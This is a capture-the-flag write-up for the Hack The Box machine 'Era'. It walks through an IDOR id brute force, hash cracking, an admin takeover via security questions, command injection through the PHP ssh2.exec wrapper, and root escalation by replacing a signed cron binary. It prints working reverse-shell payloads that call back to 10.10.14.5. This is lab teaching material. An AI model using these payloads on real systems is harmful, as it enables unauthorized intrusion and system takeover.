---
title: HTB-Era
published: 2025-11-26
draft: false
toc: true
tags: ["FTP"]
---

```
Scope:
10.10.11.79
```

# Recon
## Nmap

```bash
sudo nmap -sC -sV -sT -Pn -T5 -vvvv --min-rate=5000 era.htb

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.5
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 0309B7B14DF62A797B431119ADB37B14
|_http-title: Era Designs
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## 80/TCP - HTTP

I start off with directory enumeration and vhost fuzzing:

![](attachments/ee0cb2f09914423094ca50a57bcc0f48.png)

On the main site nothing special was found so I ran a vhost scan and found the `file` vhost:

![](attachments/95dff92ee7f4ad2be55ffc8514d316c3.png)

I added the vhost to my `/etc/hosts` file and checked it out:

![](attachments/a2306f6f4016b9e755756ba2b5106482.png)

I then enumerated the vhost as well:

![](attachments/2c2670c456b8e779312285601a677558.png)

### file.era.htb

![](attachments/94793c240e9c9c476e496bc01b50403d.png)

I went over to the `/register.php` endpoint and registered a new user:

![](attachments/9685fe8c089b5151505bfe514a93c0c6.png)

After signing in I got redirected to the `/manage.php` page:

![](attachments/4a3d73845d430467a0dde7b3b1b874b3.png)

I went ahead and uploaded a webshell:

![](attachments/287bc2782920e9962f04303af695fe66.png)

Unfortunately we can only download after uploading it but not actually access it:

![](attachments/c20b74aee056b0ccb97a21d874e4fce0.png)

However what I noticed was the `id` parameter:

```
http://file.era.htb/download.php?id=
```

This meant I could probably try to brute force other files and or directories.

I went ahead and created a list of possible id's:

![](attachments/423ef5a5bba1bd7cca3039e792ee86f6.png)

And used `ffuf`to brute force it.

```bash
ffuf -w id.txt:FUZZ -H "Cookie: PHPSESSID=lc464hh0fbipb8frebpm6otfv1" -u "http://file.era.htb/download.php?id=FUZZ" -fs 7686
```

![](attachments/08fbe3be0b9025c5b2df72ec5d91a311.png)

I checked out the brute forced id's:

![](attachments/fe64ebfda9fea758a7e4b0ada265ebfe.png)

Once downloaded I unzipped the archive:

![](attachments/776db405d51c3d6875326dfc4d67d80a.png)

I found a `filedb.sqlite` database and checked that out as well:

![](attachments/160477bc913d53535b9e46565ba50100.png)

![](attachments/5a9937a3f1db0929eef4ebc131629804.png)

### john

I then used `john` to attempt to crack these hashes:

![](attachments/a8700adb1c75a17fe028bf3e33bf4138.png)

```
america
mustang
```

I also checked out the `download.php` source code and saw this:

![](attachments/310967e169ff40ba32bf9a54be861374.png)

Next up we can change the security questions for the *admin* user so we can bypass normal security using the security questions instead via `/security_login.php`:

![](attachments/f8585cdda0de1b1cb009284657917143.png)

![](attachments/debce0324f7a12eac923a85ff2838a0a.png)

Now that it's updated I logged in:

![](attachments/ef1b1ff5de74fb4f8e2933eb872c9012.png)

![](attachments/341bc61d06462b5803926ee31ad9fa76.png)

# Foothold
## 21/TCP - FTP

Nothing here could initially be done so I resprayed the passwords against `ftp`:

![](attachments/bfa6337ff7050a5a69e6762c6b1716d3.png)

Using these creds I logged in:

![](attachments/afc44ca041de3571b3900367b3a16bad.png)

Inside the `php8.1_conf` I noticed the `ssh2` extension:

![](attachments/bbc8f716979ff84fdf0940e386a626c4.png)

>[!note]
>Since `ssh` isn't exposed to the external network we might be able to leverage this extension to log in via the website.

## Shell as eric

I checked out [the docs](https://www.php.net/manual/en/wrappers.ssh2.php) where I found my answer:

![](attachments/cd583cbeeac12a3a1d613069f26dc110.png)

I then put it all together and created the following payload, where I made sure to `base64` encode the actual reverse shell payload (since the normal way or URL encoding didn't work).

For this I'll `base64` encode the following:

```bash
(bash >& /dev/tcp/10.10.14.5/80  0>&1) &
```

![](attachments/378a1db1dfb475f0923b298c8ce0b043.png)

And insert it into the following payload:

```bash
http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20%27printf%20<INSERT_BASE64_PAYLOAD_HERE>|base64%20-d|bash%27;
```

![](attachments/4a9d3ff47b43560c063e9c8c5daa209d.png)

![](attachments/1a05aba0f88f58ba77f2f2b844eb37e5.png)

the user flag is up for grabs:

### user.txt

![](attachments/6e3b61c7475c94e5724fa4c3693679a2.png)

# Privilege Escalation
## Enumeration

I noticed that *eric* is part of the `devs` group:

![](attachments/7c41c3bc98123b708b8fa9323447b7be.png)

During further enum I found a folder that I had access to with said group:

![](attachments/c93f56307ce54f8035c21444f711c14b.png)

Inside was a script called `monitor`:

![](attachments/3d9a47ebc4e712cdcb62b17d4d36bc37.png)

I suspected that this was some sort of cron job so checked it out using `pspy64`:

![](attachments/bf14e6c5988f272625e6e5eb88fbc439.png)

After a very short while the following process popped up:

![](attachments/a590fa5fd08ed7359032d4327fa43328.png)

>[!note]
>By replacing the original executable with my own payload while preserving its location and permissions, I could place my code to run the next time the scheduled job triggered. 

## Reverse Shell as root

In order to exploit the process we can create a reverse shell payload first:

```shell
#include <stdlib.h>
int main() {
    system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'");
    return 0;
}
```

![](attachments/d84c6d282898438f71a1a92d87358245.png)

Then using the following commands we compile and overwrite the `monitor` binary with our `shell` reverse shell. This should execute a periodic reverse shell to our listener.

```bash
gcc shell.c -o shell
objcopy --dump-section .text_sig=text_sig /opt/AV/periodic-checks/monitor
objcopy --add-section .text_sig=text_sig shell 
cp shell monitor
```

![](attachments/73ba334f99cba04f8f082b0102bfb3ac.png)

Then after a short wait I receive the shell:

![](attachments/a15a91d14f2f7133812b315527e2bd81.png)

### root.txt

![](attachments/5c87f01e90ced0fe0bb3a155932dda41.png)

![](attachments/8f024a9bbb23453051706115f3a49473.png)

---